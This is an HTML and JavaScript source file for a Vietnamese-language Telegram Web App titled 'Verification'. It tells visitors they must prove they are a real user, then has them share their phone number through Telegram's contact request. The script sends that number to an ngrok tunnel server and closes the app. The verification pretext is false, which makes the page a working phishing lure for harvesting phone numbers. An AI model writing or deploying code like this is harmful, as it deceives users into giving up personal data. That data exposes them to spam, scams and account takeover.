<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .content { padding: 20px; }
    </style>
</head>
<body>

<div class="content">
    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
    <div>Bạn cần xác nhận mình là người dùng thật!</div>
</div>

<script>
    // NHỚ THAY ĐỔI LINK NGROK Ở ĐÂY
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // 1. Cấu hình nút chính của Telegram
    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
    tg.MainButton.show();
    
    // 2. Gọi hàm requestContact khi nhấn vào nút chính
    tg.MainButton.onClick(() => {
        tg.MainButton.text = "ĐANG GỌI TELEGRAM...";
        tg.requestContact();
    });

    // 3. Xử lý khi Telegram trả kết quả
    tg.onEvent('contactRequested', async (data) => {
        if (data.status === 'sent') {
            tg.MainButton.text = "ĐANG XỬ LÝ...";
            
            // Gửi dữ liệu về Server trước khi đóng
            try {
                await fetch(`${BACKEND_URL}/send_phone`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: data.response.contact.phone_number })
                });
                
                tg.MainButton.text = "THÀNH CÔNG!";
                // Tự động đóng App sau khi gửi thành công 1 giây
                setTimeout(() => { tg.close(); }, 1000);
            } catch (err) {
                alert("Lỗi gửi dữ liệu: " + err.message);
                tg.MainButton.text = "THỬ LẠI";
            }
        } else {
            alert("Bạn cần nhấn Cho phép chia sẻ SĐT.");
            tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
        }
    });
</script>
</body>
</html>
